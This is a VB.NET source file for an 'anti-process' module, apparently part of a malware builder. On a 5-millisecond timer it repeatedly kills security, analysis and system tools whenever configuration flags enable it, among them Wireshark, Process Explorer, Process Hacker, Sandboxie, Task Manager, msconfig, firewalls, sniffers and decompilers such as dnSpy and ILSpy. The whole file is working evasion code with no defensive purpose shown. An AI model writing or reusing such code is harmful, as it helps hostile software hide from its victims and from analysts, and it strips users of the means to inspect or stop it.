Imports System
Imports System.Diagnostics
Imports System.Timers
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Collections.Generic
Imports Microsoft.Win32

Public Class CsAntiProcess
    Shared N As New SooftT
    Public Shared Sub Handler(sender As Object, e As ElapsedEventArgs)

        If N.ASitemsProcess = "True" Then
            For Each A In Process.GetProcessesByName("procexp")
                A.Kill()
            Next
        End If

        If N.ASbieCtrl = "True" Then
            For Each A In Process.GetProcessesByName("SbieCtrl")
                A.Kill()
            Next
        End If

        If N.ASpyTheSpy = "True" Then
            For Each A In Process.GetProcessesByName("SpyTheSpy")
                A.Kill()
            Next
        End If

        If N.Awireshark = "True" Then
            For Each A In Process.GetProcessesByName("wireshark")
                A.Kill()
            Next
        End If

        If N.AapateDNS = "True" Then
            For Each A In Process.GetProcessesByName("apateDNS")
                A.Kill()
            Next
        End If

        If N.AIPBlocker = "True" Then
            For Each A In Process.GetProcessesByName("IPBlocker")
                A.Kill()
            Next
        End If

        If N.ATiGeR_Firewall = "True" Then
            For Each A In Process.GetProcessesByName("TiGeR-Firewall")
                A.Kill()
            Next
        End If

        If N.Asmsniff = "True" Then
            For Each A In Process.GetProcessesByName("smsniff")
                A.Kill()
            Next
        End If

        If N.AexeinfoPE = "True" Then
            For Each A In Process.GetProcessesByName("exeinfoPE")
                A.Kill()
            Next
        End If

        If N.ANetSnifferCs = "True" Then
            For Each A In Process.GetProcessesByName("NetSnifferCs")
                A.Kill()
            Next
        End If

        If N.ASandboxie_Control = "True" Then
            For Each A In Process.GetProcessesByName("Sandboxie Control")
                A.Kill()
            Next
        End If
        '1
        If N.Aprocesshacker = "True" Then
            For Each A In Process.GetProcessesByName("processhacker")
                A.Kill()
            Next
        End If

        If N.AGerenciador = "True" Then
            For Each A In Process.GetProcessesByName("taskmgr")
                A.Kill()
            Next
        End If

        If N.AMsconfig = "True" Then
            For Each A In Process.GetProcessesByName("msconfig")
                A.Kill()
            Next
        End If

        If N.AdnSpy = "True" Then
            For Each A In Process.GetProcessesByName("dnSpy")
                A.Kill()
            Next
        End If

        If N.ACodeReflect = "True" Then
            For Each A In Process.GetProcessesByName("CodeReflect")
                A.Kill()
            Next
        End If

        If N.AReflector = "True" Then
            For Each A In Process.GetProcessesByName("Reflector")
                A.Kill()
            Next
        End If

        If N.AILSpy = "True" Then
            For Each A In Process.GetProcessesByName("ILSpy")
                A.Kill()
            Next
        End If

    End Sub

    Public Shared Sub Start()
        CsAntiProcess._timer = New Timer(5.0)
        AddHandler CsAntiProcess._timer.Elapsed, AddressOf CsAntiProcess.Handler
        CsAntiProcess._timer.Enabled = True
    End Sub

    Private Shared _timer As Timer

    '======================================================================================================

End Class


